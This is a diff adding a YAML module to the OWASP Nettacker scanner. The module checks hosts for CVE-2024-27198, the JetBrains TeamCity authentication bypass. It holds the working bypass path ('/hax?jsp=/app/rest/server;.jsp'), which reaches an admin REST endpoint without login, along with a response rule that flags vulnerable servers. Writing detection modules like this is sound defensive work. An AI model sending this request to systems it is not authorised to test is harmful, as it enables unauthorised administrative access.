@@ -1,0 +1,50 @@
+info:
+  name: teamcity_cve_2024_27198_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: In JetBrains TeamCity before 2023.11.4 authentication bypass allowing to perform admin actions was possible
+  reference: 
+    - https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/
+    - https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now/
+    - https://www.tenable.com/blog/cve-2024-27198-cve-2024-27199-two-authentication-bypass-vulnerabilities-in-jetbrains-teamcity
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-27198
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve
+    - jetbrains
+    - teamcity
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{{user_agent}}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/hax?jsp=/app/rest/server;.jsp"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "buildDate"
+              reverse: false 
